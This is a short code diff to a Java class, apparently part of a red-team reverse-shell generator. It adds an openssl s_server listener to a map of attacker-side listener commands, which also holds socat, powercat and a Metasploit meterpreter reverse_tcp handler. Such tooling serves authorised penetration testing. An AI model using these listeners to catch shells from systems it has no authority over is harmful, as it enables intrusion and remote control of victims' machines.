@@ -55,5 +55,6 @@ public class RedTeam_ReverseShellGenerator {
         ListenerType.put("socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}");
         ListenerType.put("powercat", "powercat -l -p {port}");
         ListenerType.put("msfconsole", "msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit\"");
+        ListenerType.put("Openssl", "openssl s_server -quiet -key key.pem -cert cert.pem -port {port}");
     }
 }
